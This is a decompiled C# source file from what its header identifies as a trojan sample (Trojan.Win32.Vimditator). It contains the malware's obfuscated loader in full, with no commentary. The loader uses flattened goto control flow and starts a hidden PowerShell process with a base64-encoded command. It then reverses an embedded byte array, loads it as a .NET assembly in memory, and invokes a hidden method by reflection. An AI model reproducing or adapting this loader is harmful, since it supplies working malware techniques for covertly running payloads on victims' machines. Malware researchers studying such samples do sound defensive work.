// Decompiled with JetBrains decompiler
// Type: 
// Assembly: foga, Version=19.10.20069.49826, Culture=neutral, PublicKeyToken=null
// MVID: 0145B539-1701-489B-0AA4-4B8433054962
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\Trojan.Win32.Vimditator.akzi-499a2427b9e6b731968e046d23e87acb87b7eaef06954efc41c243a87616f5dd.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

public static class \u0002
{
  private static \u0002 VisitSingleton;

  [STAThread]
  public static void \u0002()
  {
    DateTime now = DateTime.Now;
    if (true)
      goto label_8;
label_6:
    DateTime dateTime;
    string shortDateString = dateTime.ToShortDateString();
    if (true)
      goto label_10;
    else
      goto label_4;
label_1:
    int num;
    switch (num)
    {
      case 0:
        return;
      case 1:
        return;
      case 2:
        break;
      default:
        return;
    }
label_4:
    if (false)
      return;
    \u0002.InsertService();
    num = \u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_2d73341fc939408b8c07d2f1b42de391 == 0 ? 0 : 0;
    goto label_1;
label_10:
    Console.WriteLine(shortDateString);
    num = 2;
    if (\u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_26e00586eb684e1095c913dca9860afb == 0)
    {
      num = 2;
      goto label_1;
    }
    else
      goto label_1;
label_8:
    dateTime = now;
    goto label_6;
  }

  private static void InsertService()
  {
    if (true)
      goto label_23;
    else
      goto label_6;
label_1:
    int num1;
    int num2 = num1;
label_2:
    int index;
    int num3;
    Type[] types;
    Type[] typeArray;
    Assembly assembly;
    switch (num2)
    {
      case 1:
        return;
      case 2:
label_3:
        ++index;
        break;
      case 3:
label_18:
        Type type = typeArray[index];
        try
        {
          MethodInfo method = type.GetMethod("Tgfctxpyzanz");
          if (\u0002.OrderSingleton(\u0002.DisableSingleton((object) method), (Type) null))
          {
            method.Invoke((object) null, (object[]) null);
            int num4 = 0;
            if (\u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_5de90d5a3fcb4e09b8f37f8f427b0db3 == 0)
              goto label_16;
label_14:
            switch (num4)
            {
              default:
                goto label_3;
            }
label_16:
            num4 = 0;
            goto label_14;
          }
          else
            goto case 2;
        }
        catch
        {
          goto case 2;
        }
      case 4:
label_20:
        ++num3;
        goto label_6;
      case 5:
        goto label_12;
      case 6:
        goto label_10;
      case 7:
        goto label_6;
      case 8:
        typeArray = types;
        index = 0;
        break;
      case 9:
        goto label_4;
      default:
        types = assembly.GetTypes();
        num1 = 8;
        goto label_1;
    }
    if (index < typeArray.Length)
      goto label_18;
    else
      goto label_20;
label_4:
    // ISSUE: variable of a boxed type
    __Boxed<DateTime> now = (ValueType) DateTime.Now;
    if (false)
    {
      num2 = 5;
      goto label_2;
    }
    else
    {
      Console.WriteLine((object) now);
      goto label_12;
    }
label_6:
    if (num3 < 99)
    {
      int num5 = num3;
      if (false)
      {
        num2 = \u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_182b26c1b826461fbc52ea9d06ce0b0f != 0 ? 4 : 9;
        goto label_2;
      }
      else
      {
        Console.WriteLine(num5);
        goto label_4;
      }
    }
    else
    {
      num2 = \u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_64a4d7929c9f4d2d9200dec31e8c7f58 == 0 ? 1 : 1;
      goto label_2;
    }
label_10:
    ProcessStartInfo startInfo = new ProcessStartInfo();
    \u0002.ValidateSingleton((object) startInfo, (object) "powershell");
    startInfo.Arguments = "-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQA=";
    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
    Process.Start(startInfo).WaitForExit();
    num2 = \u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_e63c68fb857b46ee99d8ba01aa164579 != 0 ? 4 : 3;
    goto label_2;
label_12:
    if (num3 > 20)
    {
      assembly = (Assembly) \u0002.ExcludeSingleton((object) ((IEnumerable<byte>) \u0002.RunSingleton()).Reverse<byte>().ToArray<byte>());
      num2 = \u003CModule\u003E\u007Bc9ce2cb4\u002D9062\u002D4ce5\u002D9fb5\u002D67d67daf3768\u007D.m_e63c68fb857b46ee99d8ba01aa164579 == 0 ? 0 : 0;
      goto label_2;
    }
    else
      goto label_10;
label_23:
    num3 = 0;
    num1 = 7;
    goto label_1;
  }

  internal static bool WriteSingleton() => \u0002.VisitSingleton == null;

  internal static \u0002 RegisterSingleton() => \u0002.VisitSingleton;

  internal static object RunSingleton() => (object) InitializerConfigCandidate.AddService();

  internal static object ExcludeSingleton([In] object obj0) => (object) Assembly.Load((byte[]) obj0);

  internal static Type DisableSingleton([In] object obj0) => ((MemberInfo) obj0).DeclaringType;

  internal static bool OrderSingleton([In] Type obj0, [In] Type obj1) => obj0 != obj1;

  internal static void ValidateSingleton([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).FileName = (string) obj1;
}
